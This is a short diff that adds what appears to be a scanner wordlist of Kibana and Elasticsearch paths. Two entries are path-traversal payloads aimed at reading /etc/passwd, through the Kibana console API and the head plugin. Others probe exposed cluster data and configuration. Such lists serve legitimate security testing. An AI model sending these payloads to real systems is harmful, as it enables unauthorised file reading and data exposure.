@@ -1,0 +1,12 @@
+/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
+/api/timelion/run
+
+/login
+/app/kibana
+/?pretty
+/_cat/indices?v
+/_all/_search
+/_cluster/health?pretty
+/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
+/_bulk
+/kibana.yml
